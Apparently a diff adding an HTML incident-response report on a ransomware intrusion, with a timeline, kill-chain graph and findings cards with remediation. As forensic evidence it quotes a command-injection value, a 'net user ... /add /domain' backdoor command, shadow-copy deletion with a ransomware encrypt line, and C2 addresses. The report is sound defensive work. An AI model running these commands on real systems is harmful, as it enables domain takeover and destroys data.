style='color:var(--muted);font-size:11px'>EID 7036 System.evtx</td></tr><tr><td class='tl-time'>2026-03-08 19:40:36</td><td class='tl-host'>IIS-SERV-PROD</td><td>Final webshell POST — IMDS enumeration via powershell -enc</td><td style='color:var(--muted);font-size:11px'>IIS W3SVC log</td></tr></tbody></table></div><div class="phase-block">
+<p class="phase-label">Phase 2 · Cloud Pivot &amp; Authenticated Recon</p>
+<table class="tl-table"><thead><tr><th>UTC</th><th>Host</th><th>Event</th><th>Evidence</th></tr></thead>
+<tbody><tr><td class='tl-time'>2026-03-08 21:42:11</td><td class='tl-host'>AWS</td><td>GetCallerIdentity — AWS whoami with stolen iam_role_iisserver creds from 212.8.249.213</td><td style='color:var(--muted);font-size:11px'>CloudTrail</td></tr><tr><td class='tl-time'>2026-03-08 21:42:58</td><td class='tl-host'>AWS</td><td>ListRolePolicies / ListAttachedRolePolicies — IAM enumeration</td><td style='color:var(--muted);font-size:11px'>CloudTrail</td></tr><tr><td class='tl-time'>2026-03-08 21:44:19</td><td class='tl-host'>AWS</td><td>ListUsers — domain account enumeration via AWS</td><td style='color:var(--muted);font-size:11px'>CloudTrail</td></tr><tr><td class='tl-time'>2026-03-08 21:45:38</td><td class='tl-host'>AWS</td><td>CreateAccessKey → LimitExceededException — persistence attempt failed</td><td style='color:var(--muted);font-size:11px'>CloudTrail</td></tr><tr><td class='tl-time'>2026-03-08 21:46:26</td><td class='tl-host'>AWS</td><td>ListBuckets / ListObjects — S3 target discovery</td><td style='color:var(--muted);font-size:11px'>CloudTrail</td></tr><tr><td class='tl-time'>2026-03-08 21:49:16</td><td class='tl-host'>AWS</td><td>164× GetObject — S3 data exfiltration</td><td style='color:var(--muted);font-size:11px'>CloudTrail / S3 access logs</td></tr></tbody></table></div><div class="phase-block">
+<p class="phase-label">Phase 3 · Privilege Escalation</p>
+<table class="tl-table"><thead><tr><th>UTC</th><th>Host</th><th>Event</th><th>Evidence</th></tr></thead>
+<tbody><tr><td class='tl-time'>2026-03-08 19:59:00</td><td class='tl-host'>LAF-SVR01</td><td>rnSylwOz.exe launched from \\10.3.10.12\ADMIN$ via services.exe — C2 ESTABLISHED</td><td style='color:var(--muted);font-size:11px'>Volatility pslist/netscan</td></tr><tr><td class='tl-time'>2026-03-08 20:01:16</td><td class='tl-host'>LAF-SVR01</td><td>explorer.exe PID 1332 injected — RWX PE at 0xa60000 — beacon to 173.230.136.180:8443</td><td style='color:var(--muted);font-size:11px'>Volatility malfind</td></tr><tr><td class='tl-time'>2026-03-08 20:02:14</td><td class='tl-host'>LAF-SVR01</td><td><code>net user serviceaccount P@ssw0RD1! /add /domain</code> executed as LAFAdmin</td><td style='color:var(--muted);font-size:11px'>Sysmon EID 1 ExecutableInfo</td></tr><tr><td class='tl-time'>2026-03-08 20:03:05</td><td class='tl-host'>LAF-DC01</td><td>serviceaccount added to Domain Admins — full domain control achieved</td><td style='color:var(--muted);font-size:11px'>DC01 Security EID 4728</td></tr><tr><td class='tl-time'>2026-03-08 20:03:30</td><td class='tl-host'>LAF-SVR01</td><td>LSASS dumped → C:\windows\temp\abedgdaa.dmp (12.2 MB)</td><td style='color:var(--muted);font-size:11px'>SVR01 MFT</td></tr><tr><td class='tl-time'>2026-03-08 20:08:44</td><td class='tl-host'>LAF-DC01</td><td>Impacket smbexec service UnmfmnOL installed</td><td style='color:var(--muted);font-size:11px'>DC01 System EID 7045</td></tr><tr><td class='tl-time'>2026-03-08 20:09:03</td><td class='tl-host'>LAF-DC01</td><td>VSS shadow copy — ntds.dit → C:\Windows\Temp\ZIFylmKF.tmp</td><td style='color:var(--muted);font-size:11px'>DC01 MFT</td></tr></tbody></table></div><div class="phase-block">
+<p class="phase-label">Phase 4 · Lateral Movement</p>
+<table class="tl-table"><thead><tr><th>UTC</th><th>Host</th><th>Event</th><th>Evidence</th></tr></thead>
+<tbody><tr><td class='tl-time'>2026-03-08 20:14:08</td><td class='tl-host'>LAF-SVR01</td><td>RED1 (198.51.100.3) RDP session opened on SVR01</td><td style='color:var(--muted);font-size:11px'>Volatility pstree session 6</td></tr><tr><td class='tl-time'>2026-03-08 20:16:23</td><td class='tl-host'>LAF-WS01</td><td>LAFAdmin Type-3 logon from SVR01 (10.3.10.12)</td><td style='color:var(--muted);font-size:11px'>WS01 Security 4624</td></tr><tr><td class='tl-time'>2026-03-08 20:16:46</td><td class='tl-host'>LAF-WS02</td><td>LAFAdmin Type-3 logon from SVR01 (10.3.10.12)</td><td style='color:var(--muted);font-size:11px'>WS02 Security 4624</td></tr><tr><td class='tl-time'>2026-03-08 20:20:13</td><td class='tl-host'>LAF-SVR01</td><td>msupdate.exe (renamed Makecab.exe) — Data.cab collection begins</td><td style='color:var(--muted);font-size:11px'>SVR01 MFT + Sysmon</td></tr><tr><td class='tl-time'>2026-03-08 20:35:29</td><td class='tl-host'>LAF-WS01</td><td>RED1 interactive RDP logon as LAF\Donny (Type 10)</td><td style='color:var(--muted);font-size:11px'>WS01 Security 4624</td></tr><tr><td class='tl-time'>2026-03-08 20:37:03</td><td class='tl-host'>LAF-WS01</td><td>aws_backup.exe dropped to C:\ProgramData\</td><td style='color:var(--muted);font-size:11px'>WS01 MFT</td></tr><tr><td class='tl-time'>2026-03-08 20:37:35</td><td class='tl-host'>LAF-WS01</td><td>IFEO persistence: taskmgr.exe Debugger → aws_backup.exe</td><td style='color:var(--muted);font-size:11px'>WS01 Sysmon EID 13</td></tr><tr><td class='tl-time'>2026-03-08 20:46:03</td><td class='tl-host'>LAF-DC02</td><td>Advanced IP Scanner 2.5.4594 downloaded to LAFAdmin\Downloads</td><td style='color:var(--muted);font-size:11px'>DC02 MFT</td></tr><tr><td class='tl-time'>2026-03-08 21:00:21</td><td class='tl-host'>LAF-DC02</td><td>PowerShell profile shellcode persistence installed</td><td style='color:var(--muted);font-size:11px'>DC02 MFT</td></tr><tr><td class='tl-time'>2026-03-08 21:08:28</td><td class='tl-host'>LAF-SVR01</td><td>LogDel.bat executed — event log clearing</td><td style='color:var(--muted);font-size:11px'>SVR01 Sysmon EID 1</td></tr><tr><td class='tl-time'>2026-03-08 21:57:07</td><td class='tl-host'>LAF-WS02</td><td>DisableRestrictedAdmin registry set — PtH-over-RDP enabled</td><td style='color:var(--muted);font-size:11px'>WS02 Sysmon EID 13</td></tr><tr><td class='tl-time'>2026-03-08 21:57:14</td><td class='tl-host'>LAF-WS02</td><td>DPAPI master key backup (EID 4692)</td><td style='color:var(--muted);font-size:11px'>WS02 Security</td></tr><tr><td class='tl-time'>2026-03-08 22:06:35</td><td class='tl-host'>LAF-SVR01</td><td>Outbound RDP to LAF-DC02 (10.3.10.11)</td><td style='color:var(--muted);font-size:11px'>Volatility netscan</td></tr></tbody></table></div><div class="phase-block">
+<p class="phase-label">Phase 5 · Domain Dominance &amp; Ransomware</p>
+<table class="tl-table"><thead><tr><th>UTC</th><th>Host</th><th>Event</th><th>Evidence</th></tr></thead>
+<tbody><tr><td class='tl-time'>2026-03-08 22:08:40</td><td class='tl-host'>LAF-WS02</td><td>FIRST ENCRYPTION — .bWqQUx ransomware on WS02 (OlgyLYbd sched task)</td><td style='color:var(--muted);font-size:11px'>WS02 MFT</td></tr><tr><td class='tl-time'>2026-03-08 22:09:15</td><td class='tl-host'>LAF-WS01</td><td>vssadmin delete shadows /all /quiet; IamBatman.exe encrypt C:\</td><td style='color:var(--muted);font-size:11px'>WS01 Sysmon EID 1</td></tr><tr><td class='tl-time'>2026-03-08 22:10:14</td><td class='tl-host'>LAF-DC01</td><td>DC01 encrypted — .bWqQUx files confirmed</td><td style='color:var(--muted);font-size:11px'>DC01 MFT</td></tr><tr><td class='tl-time'>2026-03-08 22:10:54</td><td class='tl-host'>LAF-DC02</td><td>DC02 encrypted</td><td style='color:var(--muted);font-size:11px'>DC02 MFT</td></tr><tr><td class='tl-time'>2026-03-08 22:30:21</td><td class='tl-host'>LAF-SVR01</td><td>Inbound RDP from RED1 (198.51.100.3) — attacker reconnects</td><td style='color:var(--muted);font-size:11px'>Volatility netscan</td></tr><tr><td class='tl-time'>2026-03-08 22:46:45</td><td class='tl-host'>LAF-SVR01</td><td>Memory image captured (KAPE / DumpIt) — investigation begins</td><td style='color:var(--muted);font-size:11px'>Volatility windows.info</td></tr></tbody></table></div></div></div><hr class="divider">
+<div id="sec-graph" data-nav="Attack Graph"><div class="section"><p class="sec-label">04 · attack graph</p><h2>Kill chain</h2><div class="graph-wrap">
+<div class="mermaid">
+flowchart LR
+    A["🌐 Internet\n172.236.127.251"] -->|"GET /CheckStatus.aspx\nOS Command Injection"| B["IIS-SERV-PROD\nCheckStatus.aspx"]
+    B -->|"certutil → so.aspx\nwebshell upload"| B2["so.aspx Webshell\ncurl/8.5.0"]
+    B2 -->|"SolarwindsTFTP\nunquoted path hijack"| C["SYSTEM on IIS\nSolarwinds.exe"]
+    C -->|"IMDS theft\niam_role_iisserver"| D["☁ AWS\n212.8.249.213\n164× S3 GetObject"]
+    C -->|"Impacket psexec\nADMIN$ service"| E["LAF-SVR01\nrnSylwOz.exe\nPID 9112"]
+    E -->|"C2 beacon\ninjected explorer"| F["C2 173.230.136.180:8443"]
+    E -->|"net user serviceaccount\nP@ssw0RD1! /add /domain"| G["LAF-DC01\nDA backdoor"]
+    G -->|"VSS shadow copy\nntds.dit → ZIFylmKF.tmp"| G2["NTDS.dit exfil"]
+    E -->|"RDP lateral\n22:06"| H["LAF-DC02\nPS profile shellcode"]
+    E -->|"SMB\nLAFAdmin"| I["LAF-WS01 (Donny)\naws_backup.exe IFEO"]
+    E -->|"SMB\nLAFAdmin"| J["LAF-WS02 (Dalton)"]
+    G -->|"sysAV.bat\nOlgyLYbd sched task"| K["🔴 RANSOMWARE\nIamBatman.exe\n.bWqQUx · 22:08 UTC"]
+    K --> I
+    K --> J
+    K --> E
+    K --> G
+    K --> H
+
+    style A fill:#1a2744,stroke:#58a6ff,color:#58a6ff
+    style B fill:#2a1a00,stroke:#ffb800,color:#ffb800
+    style B2 fill:#2a1a00,stroke:#ffb800,color:#ffb800
+    style C fill:#2a0000,stroke:#ff3b3b,color:#ff3b3b
+    style D fill:#001a2a,stroke:#00ff9c,color:#00ff9c
+    style E fill:#2a0000,stroke:#ff3b3b,color:#ff3b3b
+    style F fill:#1a0028,stroke:#c084fc,color:#c084fc
+    style G fill:#2a0000,stroke:#ff3b3b,color:#ff3b3b
+    style G2 fill:#1a0028,stroke:#c084fc,color:#c084fc
+    style H fill:#2a0000,stroke:#ff3b3b,color:#ff3b3b
+    style I fill:#2a1a00,stroke:#ffb800,color:#ffb800
+    style J fill:#2a1a00,stroke:#ffb800,color:#ffb800
+    style K fill:#2a0000,stroke:#ff3b3b,color:#ff3b3b,font-weight:bold
+
+</div></div></div></div><hr class="divider">
+<div id="sec-replay" data-nav="Kill-Chain Replay"><div class="section"><p class="sec-label">05 · kill-chain replay</p><h2>Replay the attack</h2>
+<div class="replay-shell">
+  <div class="replay-header">
+    <div class="replay-dot" style="background:#ff5f57"></div>
+    <div class="replay-dot" style="background:#febc2e"></div>
+    <div class="replay-dot" style="background:#28c840"></div>
+    <span style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);margin-left:12px">kill-chain-replay.js</span>
+  </div>
+  <div class="replay-inner">
+    <div class="host-rail">
+      <h4>Host Status</h4>
+      <div class="host-chip" id="hc-IIS_SERV_PROD">IIS-SERV-PROD</div><div class="host-chip" id="hc-LAF_SVR01">LAF-SVR01</div><div class="host-chip" id="hc-LAF_DC01">LAF-DC01</div><div class="host-chip" id="hc-LAF_DC02">LAF-DC02</div><div class="host-chip" id="hc-LAF_WS01">LAF-WS01</div><div class="host-chip" id="hc-LAF_WS02">LAF-WS02</div><div class="host-chip" id="hc-AWS">AWS</div>
+    </div>
+    <div class="event-feed"><div class="ev-row" id="ev-0"><div class="ev-dot" style="background:#58a6ff"></div><div class="ev-time">18:38</div><div class="ev-host">IIS-SERV-PROD</div><div class="ev-desc">Attacker browses target · Firefox on Kali</div></div><div class="ev-row" id="ev-1"><div class="ev-dot" style="background:#58a6ff"></div><div class="ev-time">18:40</div><div class="ev-host">IIS-SERV-PROD</div><div class="ev-desc">First OS command injection: url=Google.com | whoami</div></div><div class="ev-row" id="ev-2"><div class="ev-dot" style="background:#58a6ff"></div><div class="ev-time">18:45</div><div class="ev-host">IIS-SERV-PROD</div><div class="ev-desc">Enumerates SolarwindsTFTP unquoted service path</div></div><div class="ev-row" id="ev-3"><div class="ev-dot" style="background:#ffb800"></div><div class="ev-time">18:51</div><div class="ev-host">IIS-SERV-PROD</div><div class="ev-desc">certutil downloads so.aspx webshell from C2</div></div><div class="ev-row" id="ev-4"><div class="ev-dot" style="background:#ffb800"></div><div class="ev-time">18:52</div><div class="ev-host">IIS-SERV-PROD</div><div class="ev-desc">certutil downloads iis.exe C2 beacon</div></div><div class="ev-row" id="ev-5"><div class="ev-dot" style="background:#ffb800"></div><div class="ev-time">19:08</div><div class="ev-host">IIS-SERV-PROD</div><div class="ev-desc">Webshell activated — curl/8.5.0 POST sessions begin</div></div><div class="ev-row" id="ev-6"><div class="ev-dot" style="background:#ffb800"></div><div class="ev-time">19:38</div><div class="ev-host">IIS-SERV-PROD</div><div class="ev-desc">SolarwindsTFTP hijack → SYSTEM on IIS</div></div><div class="ev-row" id="ev-7"><div class="ev-dot" style="background:#ffb800"></div><div class="ev-time">19:59</div><div class="ev-host">LAF-SVR01</div><div class="ev-desc">rnSylwOz.exe launched from ADMIN$ — C2 173.230.136.180:8443</div></div><div class="ev-row" id="ev-8"><div class="ev-dot" style="background:#c084fc"></div><div class="ev-time">20:01</div><div class="ev-host">LAF-SVR01</div><div class="ev-desc">explorer.exe injected · beacon established</div></div><div class="ev-row" id="ev-9"><div class="ev-dot" style="background:#c084fc"></div><div class="ev-time">20:02</div><div class="ev-host">LAF-SVR01</div><div class="ev-desc">net user serviceaccount P@ssw0RD1! /add /domain</div></div><div class="ev-row" id="ev-10"><div class="ev-dot" style="background:#ff3b3b"></div><div class="ev-time">20:03</div><div class="ev-host">LAF-DC01</div><div class="ev-desc">serviceaccount → Domain Admins · DOMAIN OWNED</div></div><div class="ev-row" id="ev-11"><div class="ev-dot" style="background:#c084fc"></div><div class="ev-time">20:03</div><div class="ev-host">LAF-SVR01</div><div class="ev-desc">LSASS dump → abedgdaa.dmp</div></div><div class="ev-row" id="ev-12"><div class="ev-dot" style="background:#c084fc"></div><div class="ev-time">20:08</div><div class="ev-host">LAF-DC01</div><div class="ev-desc">Impacket smbexec · 5 random-name services installed</div></div><div class="ev-row" id="ev-13"><div class="ev-dot" style="background:#c084fc"></div><div class="ev-time">20:09</div><div class="ev-host">LAF-DC01</div><div class="ev-desc">VSS copy ntds.dit → ZIFylmKF.tmp</div></div><div class="ev-row" id="ev-14"><div class="ev-dot" style="background:#c084fc"></div><div class="ev-time">20:14</div><div class="ev-host">LAF-SVR01</div><div class="ev-desc">RED1 RDP session opened on SVR01</div></div><div class="ev-row" id="ev-15"><div class="ev-dot" style="background:#c084fc"></div><div class="ev-time">20:16</div><div class="ev-host">LAF-WS01</div><div class="ev-desc">LAFAdmin Type-3 logon from SVR01</div></div><div class="ev-row" id="ev-16"><div class="ev-dot" style="background:#c084fc"></div><div class="ev-time">20:20</div><div class="ev-host">LAF-SVR01</div><div class="ev-desc">msupdate.exe (Makecab) → Data.cab file collection</div></div><div class="ev-row" id="ev-17"><div class="ev-dot" style="background:#c084fc"></div><div class="ev-time">20:35</div><div class="ev-host">LAF-WS01</div><div class="ev-desc">RED1 RDP as Donny (Type 10) · interactive session</div></div><div class="ev-row" id="ev-18"><div class="ev-dot" style="background:#c084fc"></div><div class="ev-time">20:37</div><div class="ev-host">LAF-WS01</div><div class="ev-desc">aws_backup.exe dropped · IFEO persistence set</div></div><div class="ev-row" id="ev-19"><div class="ev-dot" style="background:#c084fc"></div><div class="ev-time">20:46</div><div class="ev-host">LAF-DC02</div><div class="ev-desc">Advanced IP Scanner downloaded · network scan</div></div><div class="ev-row" id="ev-20"><div class="ev-dot" style="background:#c084fc"></div><div class="ev-time">21:00</div><div class="ev-host">LAF-DC02</div><div class="ev-desc">PowerShell profile shellcode persistence installed</div></div><div class="ev-row" id="ev-21"><div class="ev-dot" style="background:#c084fc"></div><div class="ev-time">21:08</div><div class="ev-host">LAF-SVR01</div><div class="ev-desc">LogDel.bat — event log clearing</div></div><div class="ev-row" id="ev-22"><div class="ev-dot" style="background:#ff3b3b"></div><div class="ev-time">21:42</div><div class="ev-host">AWS</div><div class="ev-desc">GetCallerIdentity — AWS whoami with stolen EC2 creds</div></div><div class="ev-row" id="ev-23"><div class="ev-dot" style="background:#ff3b3b"></div><div class="ev-time">21:49</div><div class="ev-host">AWS</div><div class="ev-desc">164 × S3 GetObject — data exfiltration to 212.8.249.213</div></div><div class="ev-row" id="ev-24"><div class="ev-dot" style="background:#c084fc"></div><div class="ev-time">21:57</div><div class="ev-host">LAF-WS02</div><div class="ev-desc">DisableRestrictedAdmin set (PtH-over-RDP)</div></div><div class="ev-row" id="ev-25"><div class="ev-dot" style="background:#c084fc"></div><div class="ev-time">22:06</div><div class="ev-host">LAF-DC02</div><div class="ev-desc">SVR01 → DC02 outbound RDP</div></div><div class="ev-row" id="ev-26"><div class="ev-dot" style="background:#ff3b3b"></div><div class="ev-time">22:08</div><div class="ev-host">LAF-WS02</div><div class="ev-desc">FIRST ENCRYPTION — .bWqQUx · WS02 · ransomware begins</div></div><div class="ev-row" id="ev-27"><div class="ev-dot" style="background:#ff3b3b"></div><div class="ev-time">22:09</div><div class="ev-host">LAF-WS01</div><div class="ev-desc">vssadmin delete shadows · IamBatman.exe encrypt C:\</div></div><div class="ev-row" id="ev-28"><div class="ev-dot" style="background:#ff3b3b"></div><div class="ev-time">22:10</div><div class="ev-host">LAF-DC01</div><div class="ev-desc">DC01 encrypted · domain controllers down</div></div><div class="ev-row" id="ev-29"><div class="ev-dot" style="background:#c084fc"></div><div class="ev-time">22:30</div><div class="ev-host">LAF-SVR01</div><div class="ev-desc">RED1 reconnects via RDP to SVR01</div></div><div class="ev-row" id="ev-30"><div class="ev-dot" style="background:#ff3b3b"></div><div class="ev-time">22:46</div><div class="ev-host">LAF-SVR01</div><div class="ev-desc">Memory captured — investigation begins</div></div></div>
+  </div>
+  <div class="transport">
+    <button class="tp-btn" onclick="replayReset()">⏮</button>
+    <button class="tp-btn" onclick="replayBack()">◀</button>
+    <button class="tp-btn" id="btn-play" onclick="replayPlay()">▶</button>
+    <button class="tp-btn" onclick="replayFwd()">▶</button>
+    <button class="tp-btn" onclick="replayCycle()">⚡ <span id="speed-lbl">1×</span></button>
+    <div class="scrub-wrap" id="scrub-bar"><div class="scrub-fill" id="scrub-fill"></div></div>
+    <span class="ev-counter" id="ev-ctr">1/31</span>
+  </div>
+</div></div></div><hr class="divider">
+<div id="sec-acts" data-nav="Findings / Acts"><div class="section"><p class="sec-label">06 · acts &amp; chapters</p><h2>Findings</h2><div class="act-divider">
+<p class="act-num">ACT 01 // 18:38 – 19:38</p>
+<p class="act-title">Ingress &amp; Foothold</p>
+</div><div class="finding-card critical" id="finding-f01">
+  <div class="fc-header">
+    <div class="fc-id">F01</div>
+    <div class="fc-title">OS Command Injection in CheckStatus.aspx (CRITICAL)</div>
+    <div class="fc-meta">
+      <span><span class="sev-badge" style="background:#ff3b3b20;color:#ff3b3b;border:1px solid #ff3b3b40">CRITICAL</span></span>
+      <span><span class="k">CVSSv4</span><span class="v">9.3</span></span>
+      <span><span class="k">CWE</span><span class="v">CWE-78</span></span>
+      <span><span class="k">MITRE</span><span class="v">T1190</span></span>
+      <span><span class="k">Hosts</span><span class="v">IIS-SERV-PROD</span></span>
+      <span><span class="k">Status</span><span class="v" style="color:var(--red)">Pwn3d</span></span>
+    </div>
+  </div>
+  <div class="fc-body">
+    <p>The <code>url</code> parameter of <code>/CheckStatus.aspx</code> was passed directly to an OS-level command without sanitisation. An unauthenticated attacker from 172.236.127.251 injected arbitrary commands using <code>&amp;&amp;</code> and <code>|</code> separators.</p>
+<br>
+<p>What we proved: Full command execution as the IIS application pool account from the internet.</p>
+<br>
+<p>How we proved it: IIS W3SVC log at 18:40:01 — <code>url=Google.com+%26%26+whoami</code> returned the service account identity. Subsequent requests enumerated file system, uploaded webshell via certutil, and downloaded C2 beacon.</p>
+<br>
+<p>Impact: Remote code execution as an internet-facing service account. Attacker obtained webshell and C2 agent without authentication.</p>
+    <h4>Remediation</h4><p>Immediate: Disable or remove CheckStatus.aspx. Revoke IIS application pool account privileges.</p>
+<p>Short-term: Implement parameterised command execution; deploy WAF rule blocking shell metacharacters in URL parameters.</p>
+<p>Long-term: DAST integration in CI/CD pipeline; annual web application penetration test.</p>
+  </div>
+</div><div class="finding-card high" id="finding-f02">
+  <div class="fc-header">
+    <div class="fc-id">F02</div>
+    <div class="fc-title">Unquoted Service Path — SolarwindsTFTP (HIGH)</div>
+    <div class="fc-meta">
+      <span><span class="sev-badge" style="background:#ffb80020;color:#ffb800;border:1px solid #ffb80040">HIGH</span></span>
+      <span><span class="k">CVSSv4</span><span class="v">7.8</span></span>
+      <span><span class="k">CWE</span><span class="v">CWE-428</span></span>
+      <span><span class="k">MITRE</span><span class="v">T1574.009</span></span>
+      <span><span class="k">Hosts</span><span class="v">IIS-SERV-PROD</span></span>
+      <span><span class="k">Status</span><span class="v" style="color:var(--red)">Pwn3d</span></span>
+    </div>
+  </div>
+  <div class="fc-body">
+    <p>The <code>SolarwindsTFTP</code> Windows service ImagePath contained an unquoted path with a space: <code>C:\Program Files\SolarWinds\TFTP Server\SolarWinds TFTP Server.exe</code>. An attacker with write access to <code>C:\</code> placed <code>Solarwinds.exe</code> there, which was executed as SYSTEM when the service was restarted.</p>
+<br>
+<p>What we proved: Local privilege escalation from IIS service account to SYSTEM.</p>
+<br>
+<p>How we proved it: EID 7036 System event log on IIS-SERV-PROD at 19:38:02 records the TFTP service starting. SVR01 Sysmon and IIS logs confirm the timing of the SYSTEM shell.</p>
+<br>
+<p>Impact: Full local SYSTEM access on IIS-SERV-PROD, enabling IMDS credential theft and pivoting.</p>
+    <h4>Remediation</h4><p>Immediate: Quote the service path: <code>&quot;C:\Program Files\SolarWinds\TFTP Server\SolarWinds TFTP Server.exe&quot;</code>.</p>
+<p>Short-term: Audit all service paths for unquoted entries (PowerShell: <code>Get-WmiObject Win32_Service | Where {$_.PathName -notmatch &#x27;&quot;&#x27;}</code>).</p>
+<p>Long-term: Restrict write access to program directories; deploy application allow-listing.</p>
+  </div>
+</div><div class="act-divider">
+<p class="act-num">ACT 02 // 19:59 – 20:09</p>
+<p class="act-title">Implant &amp; Domain Compromise</p>
+</div><div class="finding-card critical" id="finding-f03">
+  <div class="fc-header">
+    <div class="fc-id">F03</div>
+    <div class="fc-title">Impacket Remote Service Execution → Domain Admin (CRITICAL)</div>
+    <div class="fc-meta">
+      <span><span class="sev-badge" style="background:#ff3b3b20;color:#ff3b3b;border:1px solid #ff3b3b40">CRITICAL</span></span>
+      <span><span class="k">CVSSv4</span><span class="v">9.8</span></span>
+      <span><span class="k">CWE</span><span class="v">CWE-287</span></span>
+      <span><span class="k">MITRE</span><span class="v">T1569.002 / T1136.002 / T1098</span></span>
+      <span><span class="k">Hosts</span><span class="v">LAF-SVR01, LAF-DC01</span></span>
+      <span><span class="k">Status</span><span class="v" style="color:var(--red)">Pwn3d</span></span>
+    </div>
+  </div>
+  <div class="fc-body">
+    <p>Using the compromised <code>LAF\LAFAdmin</code> Domain Admin account, the attacker deployed <code>rnSylwOz.exe</code> to SVR01&#x27;s ADMIN$ share and launched it as a Windows service. From the resulting C2 session, a new Domain Admin account (<code>LAF\serviceaccount</code>) was created and added to Domain Admins in under four minutes.</p>
+<br>
+<p>What we proved: Unauthenticated-to-Domain-Admin in 25 minutes from first web request.</p>
+<br>
+<p>How we proved it:</p>
+<ul>
+<li>Volatility pslist: <code>rnSylwOz.exe</code> PID 9112, parent <code>services.exe</code> PID 672, image <code>\\10.3.10.12\ADMIN$\rnSylwOz.exe</code>, started 19:59:00.</li>
+<li>Volatility malfind: injected PE in <code>explorer.exe</code> PID 1332 at RWX 0xa60000, SHA256=<code>6ef6b52f…228c</code>.</li>
+<li>SVR01 Sysmon EID 1 at 20:02:14: <code>cmd.exe /c net user serviceaccount P@ssw0RD1! /add /domain</code>.</li>
+<li>DC01 Security EID 4720 at 20:02:14 + EID 4728 at 20:03:05.</li>
+</ul>
+<br>
+<p>Impact: Complete domain takeover. Attacker held Domain Admin for 2h45m before ransomware detonation.</p>
+    <h4>Remediation</h4><p>Immediate: Delete <code>LAF\serviceaccount</code>. Reset all Domain Admin passwords including LAFAdmin. Rotate krbtgt ×2.</p>
+<p>Short-term: Restrict ADMIN$ access; enforce tiered admin model (PAW + jump server); enable Protected Users for all DA accounts.</p>
+<p>Long-term: Deploy Privileged Access Workstations; implement Just-In-Time privileged access.</p>
+  </div>
+</div><div class="act-divider">
+<p class="act-num">ACT 03 // 20:20 – 21:51</p>
+<p class="act-title">Data Exfiltration &amp; Cloud Pivot</p>
+</div><div class="finding-card critical" id="finding-f04">
+  <div class="fc-header">
+    <div class="fc-id">F04</div>
+    <div class="fc-title">NTDS.dit Extraction via VSS + AWS Credential Exfiltration (CRITICAL)</div>
+    <div class="fc-meta">
+      <span><span class="sev-badge" style="background:#ff3b3b20;color:#ff3b3b;border:1px solid #ff3b3b40">CRITICAL</span></span>
+      <span><span class="k">CVSSv4</span><span class="v">9.1</span></span>
+      <span><span class="k">CWE</span><span class="v">CWE-522</span></span>
+      <span><span class="k">MITRE</span><span class="v">T1003.003 / T1552.004</span></span>
+      <span><span class="k">Hosts</span><span class="v">LAF-DC01, AWS-464381121764</span></span>
+      <span><span class="k">Status</span><span class="v" style="color:var(--red)">Pwn3d</span></span>
+    </div>
+  </div>
+  <div class="fc-body">
+    <p>The attacker extracted NTDS.dit via Volume Shadow Copy (Impacket secretsdump) and separately stole the IIS EC2 instance-role credentials via IMDS, using them from an external VPS to exfiltrate 164 S3 objects.</p>
+<br>
+<p>What we proved: All AD password hashes compromised; 164 S3 objects exfiltrated.</p>
+<br>
+<p>How we proved it:</p>
+<ul>
+<li>DC01 System EID 7045 at 20:08:44-20:09:04: five random-name services (QsYyAARL etc.) matching Impacket smbexec pattern.</li>
+<li>DC01 MFT: <code>ZIFylmKF.tmp</code> created 20:09:03 (VSS copy of ntds.dit).</li>
+<li>CloudTrail: 164 GetObject from 212.8.249.213 using <code>iam_role_iisserver</code> token 21:49–21:51.</li>
+<li>GuardDuty sev8: <code>UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS</code>.</li>
+</ul>
+<br>
+<p>Impact: All domain credentials exposed. Persistent re-entry possible via golden ticket. AWS data exfiltration confirmed.</p>
+    <h4>Remediation</h4><p>Immediate: Rotate <code>krbtgt</code> ×2 (invalidates all Kerberos tickets). Revoke/rotate EC2 instance role. Enforce IMDSv2 (hop-limit=1).</p>
+<p>Short-term: Deploy Azure AD / Entra SSPR to mass-reset all user passwords. Enable CloudTrail data events on all S3 buckets.</p>
+<p>Long-term: Secrets Manager for application credentials; detective control alerting on NTDS access.</p>
+  </div>
+</div><div class="act-divider">
+<p class="act-num">ACT 04 // 22:00 – 22:46</p>
+<p class="act-title">Persistence &amp; Ransomware</p>
+</div><div class="finding-card critical" id="finding-f05">
+  <div class="fc-header">
+    <div class="fc-id">F05</div>
+    <div class="fc-title">Ransomware Deployment (CRITICAL)</div>
+    <div class="fc-meta">
+      <span><span class="sev-badge" style="background:#ff3b3b20;color:#ff3b3b;border:1px solid #ff3b3b40">CRITICAL</span></span>
+      <span><span class="k">CVSSv4</span><span class="v">10.0</span></span>
+      <span><span class="k">CWE</span><span class="v">CWE-829</span></span>
+      <span><span class="k">MITRE</span><span class="v">T1486 / T1490 / T1053.005</span></span>
+      <span><span class="k">Hosts</span><span class="v">LAF-WS01, LAF-WS02, LAF-SVR01, LAF-DC01, LAF-DC02</span></span>
+      <span><span class="k">Status</span><span class="v" style="color:var(--red)">Pwn3d</span></span>
+    </div>
+  </div>
+  <div class="fc-body">
+    <p>IamBatman.exe ransomware was deployed via a Group Policy-delivered scheduled task (<code>OlgyLYbd</code>) triggered by the <code>sysAV.bat</code> orchestrator on the SYSVOL share. VSS copies were deleted first, then all files were encrypted with extension <code>.bWqQUx</code>. A ransom note <code>README_bWqQUx.txt</code> was dropped in every encrypted directory.</p>
+<br>
+<p>What we proved: Full environment encryption across all five domain members. No backups survived (VSS deleted).</p>
+<br>
+<p>How we proved it:</p>
+<ul>
+<li>WS02 MFT: first <code>.bWqQUx</code> file at 22:08:40; WS01 22:09:16; SVR01 22:09:46; DC01 22:10:14; DC02 22:10:54.</li>
+<li>WS01 Sysmon EID 1 at 22:09:16: <code>vssadmin.exe delete shadows /all /quiet</code> followed by <code>\\LAF-DC02\sysvol\IamBatman.exe encrypt C:\</code>.</li>
+<li>WS01 EID 106 (TaskScheduler): <code>\OlgyLYbd</code> registered at 22:09:15 by LAF\LAFAdmin from 10.3.10.12.</li>
+</ul>
+<br>
+<p>Impact: Total operational disruption. 2,025+ files encrypted across the domain.</p>
+    <h4>Remediation</h4><p>Immediate: Isolate all affected hosts. Restore from offline backups (if available). Do not pay ransom.</p>
+<p>Short-term: Rebuild from clean images. Implement immutable backup solution (3-2-1 with air-gap). Restrict SYSVOL write permissions.</p>
+<p>Long-term: Network segmentation to prevent east-west ransomware propagation; endpoint detection covering scheduled task creation + shadow copy deletion.</p>
+  </div>
+</div></div></div><hr class="divider">
